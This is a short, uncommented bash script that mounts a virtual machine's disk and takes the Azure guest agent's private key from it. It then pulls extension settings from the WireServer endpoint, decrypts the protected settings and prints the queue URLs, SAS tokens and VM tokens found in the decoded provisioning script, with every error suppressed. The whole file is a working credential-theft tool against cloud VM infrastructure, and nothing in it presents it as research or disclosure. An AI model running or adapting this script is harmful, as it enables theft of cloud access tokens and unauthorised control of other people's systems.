#!/bin/bash
mount /dev/sda1 /tmp/vmroot 2>/dev/null
mount /dev/sdc1 /tmp/vmroot 2>/dev/null

PRVFILE=$(ls /tmp/vmroot/var/lib/waagent/*.prv 2>/dev/null | head -1)
echo "CRP_KEY: $(basename "$PRVFILE" .prv 2>/dev/null)"

python3 -c "
import json
with open('/tmp/vmroot/var/lib/waagent/SharedConfig.xml') as f:
    pass
" 2>/dev/null

curl -s -H 'x-ms-version: 2012-11-30' 'http://168.63.129.16:32526/vmSettings' 2>/dev/null > /tmp/vmsettings.json

python3 -c "
import json
with open('/tmp/vmsettings.json') as f:
    d=json.load(f)
sub=d.get('statusUploadBlob',{}).get('value','')
art=d.get('inVMArtifactsProfileBlob','')
print('STATUS_BLOB:', sub[:200])
print('ARTIFACTS_BLOB:', art[:200])
for ext in d.get('extensionGoalStates',[]):
    sl=ext.get('settings',[])
    if isinstance(sl,list):
        for s in sl:
            prs=s.get('protectedSettings','')
            if prs and len(prs)>100:
                print('HAS_PROTECTED_SETTINGS: YES')
                with open('/tmp/prot_b64.txt','w') as f:
                    f.write(prs)
" 2>/dev/null

if [ -f /tmp/prot_b64.txt ] && [ -n "$PRVFILE" ]; then
    base64 -d /tmp/prot_b64.txt > /tmp/prot.der 2>/dev/null
    openssl cms -decrypt -inform DER -inkey "$PRVFILE" < /tmp/prot.der > /tmp/plaintext.txt 2>/dev/null
    python3 -c "
import json,base64
with open('/tmp/plaintext.txt') as f:
    d=json.load(f)
script=base64.b64decode(d['script']).decode()
with open('/tmp/vm_init_decoded.sh','w') as out:
    out.write(script)
" 2>/dev/null
    echo "=== QUEUE ==="
    grep 'SCRIPT_PARAM_VM_QUEUE_URL' /tmp/vm_init_decoded.sh | head -1
    grep 'SCRIPT_PARAM_VM_QUEUE_NAME' /tmp/vm_init_decoded.sh | head -1
    grep 'SCRIPT_PARAM_VM_QUEUE_SASTOKEN' /tmp/vm_init_decoded.sh | head -1
    echo "=== VMTOKEN (first 100) ==="
    grep 'SCRIPT_PARAM_VMTOKEN' /tmp/vm_init_decoded.sh | head -1 | cut -c1-120
fi

umount /tmp/vmroot 2>/dev/null
